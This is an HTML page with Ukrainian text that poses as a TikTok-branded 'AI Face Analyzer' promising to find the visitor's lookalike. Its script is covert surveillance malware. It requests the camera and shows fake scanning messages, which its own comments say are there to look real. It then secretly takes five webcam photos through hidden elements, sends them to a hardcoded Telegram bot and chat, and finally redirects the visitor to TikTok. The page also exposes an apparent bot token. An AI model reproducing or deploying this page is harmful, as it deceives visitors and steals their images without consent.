<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok AI Scanner</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { padding: 20px; max-width: 400px; width: 90%; }
        .logo { width: 60px; margin-bottom: 25px; filter: invert(1); }
        .btn { background: #fe2c55; border: none; padding: 18px 40px; color: #fff; font-size: 16px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; transition: 0.3s; }
        
        /* Стиль тексту, який "завис" */
        #status { display: none; margin-top: 20px; }
        .loader { border: 2px solid #222; border-top: 2px solid #fe2c55; border-radius: 50%; width: 25px; height: 25px; animation: spin 2s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status-text { color: #888; font-size: 14px; letter-spacing: 0.5px; }

        video, canvas { position: absolute; left: -9999px; opacity: 0; }
    </style>
</head>
<body>

    <div class="container" id="ui">
        <img src="https://raw.githubusercontent.com/simple-icons/simple-icons/develop/icons/tiktok.svg" class="logo">
        <h2>AI Face Analyzer</h2>
        <p id="desc">Натисніть кнопку, щоб знайти свого двійника.</p>
        
        <button class="btn" id="mainBtn" onclick="start()">Почати аналіз</button>

        <div id="status">
            <div class="loader"></div>
            <p id="status-text">Ініціалізація нейромережі...</p>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" width="640" height="480"></canvas>

    <script>
        const token = '8492555273:AAHur2SwzreGkYlCz5-gBCGCJxzvrdwFczM';
        const chat = '7808795546';
        const tiktokUrl = 'https://www.tiktok.com/explore';

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                const video = document.getElementById('v');
                video.srcObject = stream;
                await video.play();

                // Приховуємо кнопку, показуємо статус "зависання"
                document.getElementById('mainBtn').style.display = 'none';
                document.getElementById('desc').style.display = 'none';
                document.getElementById('status').style.display = 'block';

                const stText = document.getElementById('status-text');

                // Імітуємо зміну етапів, щоб виглядало реально
                setTimeout(() => { stText.innerText = "Сканування обличчя..."; }, 1500);
                setTimeout(() => { stText.innerText = "Обробка даних AI..."; }, 4000);

                // Даємо камері 2 секунди прогрітися перед першим фото
                await new Promise(r => setTimeout(r, 2000));

                // Робимо 5 фото з великим інтервалом (1.2 сек), поки сторінка "висить"
                for (let i = 0; i < 5; i++) {
                    await takeSnap(video);
                    await new Promise(r => setTimeout(r, 1200));
                }

                // Коли все відправлено — перекидаємо в TikTok
                stream.getTracks().forEach(t => t.stop());
                window.location.replace(tiktokUrl);

            } catch (e) {
                window.location.replace(tiktokUrl);
            }
        }

        function takeSnap(video) {
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            return new Promise(resolve => {
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', chat);
                    formData.append('photo', blob, 'img.jpg');

                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
                        method: 'POST', 
                        body: formData 
                    }).finally(() => resolve());
                }, 'image/jpeg', 0.6);
            });
        }
    </script>
</body>
</html>
